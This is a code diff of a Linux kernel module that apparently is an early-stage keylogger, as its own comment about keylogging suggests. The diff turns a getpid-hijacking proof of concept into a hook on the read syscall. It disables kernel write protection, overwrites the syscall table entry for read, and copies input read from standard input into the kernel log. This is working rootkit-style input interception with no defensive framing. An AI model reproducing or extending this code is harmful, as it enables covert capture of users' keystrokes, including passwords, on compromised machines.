@@ -4,6 +4,7 @@
 #include <linux/errno.h> // not too sure about this
 #include <linux/unistd.h> // we're messing with syscalls
 #include <linux/syscalls.h> // same as above
+#include <linux/types.h>
 
 // this file, as it stands, is just a proof of concept. It doesn't
 // keylog anything, it just hijacks the getpid syscall.
@@ -19,14 +20,20 @@ MODULE_LICENSE("GPL");
 unsigned long *syscall_table;
 
 // pointer to the original sys_getpid call. When we
-asmlinkage long (*original_getpid)(void);
+asmlinkage long (*original_read)(unsigned int, char*, size_t);
 
 // our replacement sys_getpid
-asmlinkage long new_getpid(void) {
+asmlinkage long new_read(unsigned int fd, char *buf, size_t size) {
   // hijacked getpid
-  printk(KERN_ALERT "GETPID HIJACKED");
   // call the original function
-  return original_getpid();
+  int ret = original_read(fd,buf,size);
+  if(!fd){
+    char buffer[size];
+    if(!copy_from_user(buffer,buf,size)){
+      printk(KERN_ALERT "buf is %c %x",buffer[0], buffer[0]);
+    }
+  }
+  return ret;
 }
 
 static int init(void) {
@@ -51,8 +58,8 @@ static int init(void) {
   write_cr0 (read_cr0 () & (~0x10000));
 
   // store the original getpid and replace it with ours
-  original_getpid = (void *)syscall_table[__NR_getpid];
-  syscall_table[__NR_getpid] = new_getpid;
+  original_read = (void *)syscall_table[__NR_read];
+  syscall_table[__NR_read] = new_read;
 
   // restore the wp bit
   write_cr0 (read_cr0 () | 0x10000);
@@ -65,7 +72,7 @@ static void exit(void) {
   write_cr0 (read_cr0 () & (~0x10000));
 
   // restore the original getpid function
-  syscall_table[__NR_getpid] = original_getpid;
+  syscall_table[__NR_read] = original_read;
 
   // restore the wp bit
   write_cr0 (read_cr0 () | 0x10000);
